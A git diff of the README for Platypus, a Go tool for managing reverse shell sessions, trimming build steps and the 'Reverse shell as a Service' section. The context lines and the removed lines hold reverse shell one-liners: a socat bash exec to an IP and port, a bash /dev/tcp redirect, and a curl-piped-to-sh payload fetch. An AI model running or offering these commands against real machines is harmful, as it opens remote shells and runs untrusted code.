@@ -30,8 +30,6 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 ```
 git clone https://github.com/WangYihang/Platypus
 cd Platypus
-go get -u github.com/go-bindata/go-bindata/...
-go-bindata -pkg resource -o ./lib/util/resource/resource.go ./lib/runtime/...
 go run platypus.go
 ```
 ![](figure/install.gif)
@@ -100,25 +98,10 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
 #### Upload file
 ![](./figure/upload.gif)
 
-### Other useful feature
+### Advanced [USAGE](./USAGE.md)
 
-#### Reverse shell as a Service
-> [USAGE](./USAGE.md)
-
-> NOTICE: ONLY WORKS on *NIX
-
-The command `bash -c "bash -i >/dev/tcp/8.8.8.8/1337 0>&1"` is the equivalent of `curl http://192.168.174.132:8080/8.8.8.8/1337 | sh`, this feature provides the capability to redirect new reverse shell to another ip and port with out type the boring reverse shell command.
-
-If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`8.8.8.8/1337`) can be omited, like this:
-```bash
-curl http://192.168.174.132:8080/ | sh
-```
-Once the command get executed, the reverse shell session will appear in platypus which is listening on `192.168.174.132:8080`.
-
-#### RESTful API
-> [USAGE](./USAGE.md)
-
-> Demonstration is to be done.
+* Reverse shell as a Service (RaaS)
+* RESTful API
 
 #### Using `VIM` in Reverse Shell (Only on `Linux`)
 > Demonstration is to be done.
